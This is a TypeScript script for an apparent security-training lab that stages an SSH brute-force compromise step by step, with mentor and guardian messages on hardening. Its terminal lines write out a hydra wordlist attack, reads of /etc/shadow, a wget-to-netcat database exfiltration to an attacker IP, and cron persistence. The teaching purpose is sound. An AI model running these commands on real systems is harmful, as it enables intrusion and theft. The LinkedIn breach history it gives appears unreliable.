import { ScenarioScript } from '../lab-engine';

export const weakPassScript: ScenarioScript = {
    id: 'weakpass-01',

    victimScreens: [
        { id: 'ssh-terminal',    type: 'desktop', url: '192.168.1.45', content: 'SSH_TERMINAL' },
        { id: 'brute-attempts',  type: 'desktop', url: '192.168.1.45', content: 'BRUTE_ATTEMPTS' },
        { id: 'login-cracked',   type: 'desktop', url: '192.168.1.45', content: 'LOGIN_CRACKED' },
        { id: 'inside-system',   type: 'desktop', url: '192.168.1.45', content: 'INSIDE_SYSTEM' },
        { id: 'compromised',     type: 'result',  url: '192.168.1.45', content: 'COMPROMISED' },
    ],

    phases: [
        // ── PHASE 1 — RECON ───────────────────────────────────────────────
        {
            id: 'recon',
            name: 'SCANNING & ENUMERATION',
            autoPlay: true,
            progressPct: 15,
            victimScreen: 'ssh-terminal',
            terminalLines: [
                { text: '══════════════════════════════════════',       type: 'dim',     delay: 0 },
                { text: '  ATTACKER TERMINAL — Weak Pass',             type: 'dim',     delay: 100 },
                { text: '══════════════════════════════════════',       type: 'dim',     delay: 200 },
                { text: '',                                             type: 'dim',     delay: 300 },
                { text: 'nmap -sV 192.168.1.45',                       type: 'command', delay: 500 },
                { text: '[*] Scanning target...',                       type: 'info',    delay: 1200 },
                { text: 'PORT   STATE SERVICE VERSION',                 type: 'output',  delay: 2400 },
                { text: '22/tcp open  ssh     OpenSSH 8.2',             type: 'output',  delay: 2600 },
                { text: '[+] SSH service found on port 22',            type: 'success', delay: 3000 },
                { text: '[*] Checking for default credentials...',      type: 'info',    delay: 3800 },
                { text: '[*] Checking banner for OS info...',           type: 'info',    delay: 4500 },
                { text: '[+] OS: Ubuntu 20.04 LTS',                    type: 'data',    delay: 5000 },
                { text: '',                                             type: 'dim',     delay: 5400 },
                { text: '[*] Starting brute force attack...',           type: 'warning', delay: 6000, trigger: 'brute-attempts' },
                { text: '',                                             type: 'dim',     delay: 6400 },
                { text: 'hydra -l admin -P rockyou.txt 192.168.1.45 ssh', type: 'command', delay: 6700 },
                { text: '[*] Hydra starting...',                        type: 'info',    delay: 7200 },
                { text: '[*] Target: 192.168.1.45',                    type: 'data',    delay: 7500 },
                { text: '[*] Login: admin',                            type: 'data',    delay: 7700 },
                { text: '[*] Wordlist: rockyou.txt (14M passwords)',   type: 'warning', delay: 7900 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'nmap discovered SSH running on port 22. SSH is a remote login service — if the attacker can crack the password they get full command line access to the server. Port 22 should never be exposed to the internet without additional protection.',
                },
                {
                    agent: 'guardian', type: 'redflag',
                    text: 'SSH is exposed on port 22 with no rate limiting. This allows unlimited password attempts. SSH should use key-based authentication only — passwords should be disabled entirely for SSH access.',
                },
            ],
        },

        // ── PHASE 2 — BRUTE FORCE ─────────────────────────────────────────
        {
            id: 'brute-force',
            name: 'AUTOMATED BRUTE FORCE',
            autoPlay: false,
            progressPct: 35,
            victimScreen: 'brute-attempts',
            terminalLines: [
                { text: '',                                              type: 'dim',     delay: 0 },
                { text: '[ATTEMPT] admin:password     → Connection failed', type: 'error',   delay: 300 },
                { text: '[ATTEMPT] admin:123456       → Connection failed', type: 'error',   delay: 500 },
                { text: '[ATTEMPT] admin:admin        → Connection failed', type: 'error',   delay: 700 },
                { text: '[ATTEMPT] admin:letmein      → Connection failed', type: 'error',   delay: 900 },
                { text: '[ATTEMPT] admin:qwerty       → Connection failed', type: 'error',   delay: 1100 },
                { text: '[*] 100 attempts completed...',                 type: 'info',    delay: 1500 },
                { text: '[ATTEMPT] admin:sunshine     → Connection failed', type: 'error',   delay: 1800 },
                { text: '[ATTEMPT] admin:monkey       → Connection failed', type: 'error',   delay: 2000 },
                { text: '[*] 500 attempts completed...',                 type: 'info',    delay: 2500 },
                { text: '[ATTEMPT] admin:admin123     → Connection failed', type: 'error',   delay: 2800 },
                { text: '[*] 800 attempts completed...',                 type: 'info',    delay: 3200 },
                { text: '[ATTEMPT] admin:password123  → Connection failed', type: 'error',   delay: 3500 },
                { text: '[ATTEMPT] admin:welcome      → Connection failed', type: 'error',   delay: 3700 },
                { text: '[*] 1000 attempts completed...',                type: 'info',    delay: 4200 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'Hydra is trying passwords from rockyou.txt — a list of 14 million real passwords leaked from previous breaches. These are passwords real people actually used. If your password is in this list it will be cracked.',
                },
                {
                    agent: 'guardian', type: 'redflag',
                    text: '1000 brute force attempts detected on SSH port 22. Fail2ban would have blocked the attacker after 5 failed attempts. Rate limiting and IP blocking are simple configurations that stop this attack completely.',
                },
            ],
            decisionPoint: {
                id: 'brute-decision',
                question: 'Your server SSH is being attacked with automated password attempts. What configuration would have prevented this?',
                description: 'Full attack plays out to show consequences of weak SSH security.',
                choices: [
                    { label: '🔑 Disable password auth — use SSH keys only', safe: true,  consequence: 'Correct — key-based auth makes brute force impossible' },
                    { label: '🔒 Use a longer password',                      safe: false, consequence: 'Longer helps but without rate limiting it can still be cracked' },
                ],
            },
            nextPhase: 'cracked',
        },

        // ── PHASE 3 — CRACKED ─────────────────────────────────────────────
        {
            id: 'cracked',
            name: 'PASSWORD CRACKED',
            autoPlay: true,
            progressPct: 60,
            victimScreen: 'brute-attempts',
            terminalLines: [
                { text: '',                                              type: 'dim',     delay: 0 },
                { text: '[*] 1247 attempts completed...',                type: 'info',    delay: 300 },
                { text: '[ATTEMPT] admin:admin123!    → Connection failed', type: 'error',   delay: 700 },
                { text: '[ATTEMPT] admin:Welcome1     → Connection failed', type: 'error',   delay: 1000 },
                { text: '[ATTEMPT] admin:Pass@123     → Connection failed', type: 'error',   delay: 1300 },
                { text: '[ATTEMPT] admin:server123    →',                   type: 'warning', delay: 1800, trigger: 'login-cracked' },
                { text: '[+] !!!SUCCESS!!!',                             type: 'success', delay: 2400 },
                { text: '[+] Login: admin',                              type: 'data',    delay: 2700 },
                { text: '[+] Password: server123',                       type: 'data',    delay: 3000 },
                { text: '[+] Host: 192.168.1.45',                        type: 'data',    delay: 3300 },
                { text: '',                                              type: 'dim',     delay: 3800 },
                { text: 'ssh admin@192.168.1.45',                        type: 'command', delay: 4200 },
                { text: 'Warning: Permanently added host to known hosts', type: 'warning', delay: 4800 },
                { text: 'admin@192.168.1.45 password: server123',         type: 'output',  delay: 5800 },
                { text: 'Last login: Mon Nov 11 09:23:11 2024',          type: 'output',  delay: 6500 },
                { text: 'Welcome to Ubuntu 20.04.6 LTS',                 type: 'success', delay: 6800 },
                { text: 'admin@corp-server:~$',                          type: 'success', delay: 7200, trigger: 'inside-system' },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'Password cracked after 1247 attempts. server123 is a predictable pattern — a word followed by numbers. Attackers know humans use these patterns and wordlists are built around them. A random 16 character password would take centuries to crack.',
                },
                {
                    agent: 'guardian', type: 'alert',
                    text: 'SSH credentials compromised. Attacker has shell access to your server. Immediately: change all passwords, revoke the compromised key, check auth logs for what was accessed, enable fail2ban, disable password authentication.',
                },
            ],
        },

        // ── PHASE 4 — INSIDE ──────────────────────────────────────────────
        {
            id: 'inside',
            name: 'SERVER COMPROMISED',
            autoPlay: true,
            progressPct: 80,
            victimScreen: 'inside-system',
            terminalLines: [
                { text: '',                                              type: 'dim',     delay: 0 },
                { text: 'admin@corp-server:~$ whoami',                   type: 'command', delay: 500 },
                { text: 'admin',                                         type: 'output',  delay: 900 },
                { text: '',                                              type: 'dim',     delay: 1200 },
                { text: 'admin@corp-server:~$ sudo -l',                  type: 'command', delay: 1800 },
                { text: '[+] User admin may run ALL commands as root!',   type: 'success', delay: 2400 },
                { text: '',                                              type: 'dim',     delay: 2800 },
                { text: 'admin@corp-server:~$ sudo cat /etc/passwd',     type: 'command', delay: 3300 },
                { text: '[+] User database exposed',                     type: 'error',   delay: 3900 },
                { text: '',                                              type: 'dim',     delay: 4200 },
                { text: 'admin@corp-server:~$ sudo cat /etc/shadow',     type: 'command', delay: 4700 },
                { text: '[+] Password hashes extracted!',                 type: 'error',   delay: 5300 },
                { text: '',                                              type: 'dim',     delay: 5700 },
                { text: 'admin@corp-server:~$ find / -name "*.sql" 2>/dev/null', type: 'command', delay: 6200 },
                { text: '[+] Found: /var/www/html/db/corpbank.sql',       type: 'data',    delay: 7200 },
                { text: '[+] Database backup found!',                     type: 'success', delay: 7600 },
                { text: '',                                              type: 'dim',     delay: 8000 },
                { text: 'admin@corp-server:~$ wget -O - corpbank.sql | nc 192.168.1.200 9999', type: 'command', delay: 8600 },
                { text: '[+] Database exfiltrated!',                      type: 'error',   delay: 9800 },
                { text: '',                                              type: 'dim',     delay: 10200 },
                { text: 'admin@corp-server:~$ crontab -e',               type: 'command', delay: 10800 },
                { text: '[+] Backdoor persistence installed',            type: 'error',   delay: 11600 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'With SSH access the attacker found the admin user has sudo privileges — root access to everything. They extracted password hashes, found a database backup and installed a persistent backdoor. One weak password gave keys to the kingdom.',
                },
                {
                    agent: 'guardian', type: 'prevention',
                    text: 'Immediate server hardening: disable root login via SSH, implement principle of least privilege, use SSH keys not passwords, install fail2ban, enable firewall rules, monitor auth logs for suspicious access.',
                },
            ],
            nextPhase: 'compromised',
        },

        // ── PHASE 5 — COMPROMISED ─────────────────────────────────────────
        {
            id: 'compromised',
            name: 'ATTACK COMPLETE',
            autoPlay: true,
            progressPct: 100,
            victimScreen: 'inside-system',
            terminalLines: [
                { text: '',                                              type: 'dim',     delay: 0 },
                { text: '[+] Attack summary:',                          type: 'data',    delay: 400, trigger: 'compromised' },
                { text: '[+] Method: SSH brute force',                  type: 'data',    delay: 900 },
                { text: '[+] Attempts: 1,247',                          type: 'data',    delay: 1300 },
                { text: '[+] Time: 4 minutes',                          type: 'data',    delay: 1700 },
                { text: '[+] Access level: Root',                       type: 'data',    delay: 2100 },
                { text: '[+] Data stolen: Full database',               type: 'data',    delay: 2500 },
                { text: '[+] Persistence: Installed',                   type: 'data',    delay: 2900 },
                { text: '[+] SERVER FULLY COMPROMISED',                 type: 'error',   delay: 3500 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The 2012 LinkedIn breach started with brute forced credentials. 117 million password hashes were stolen. Analysis showed 700,000 users had 123456 as their password. Weak passwords at scale create catastrophic breaches.',
                },
                {
                    agent: 'guardian', type: 'prevention',
                    text: 'Future prevention: use SSH key-based authentication only, install fail2ban, change default SSH port from 22, use strong unique passwords minimum 16 chars, implement 2FA on all admin access, monitor authentication logs daily.',
                },
            ],
        },
    ],
};
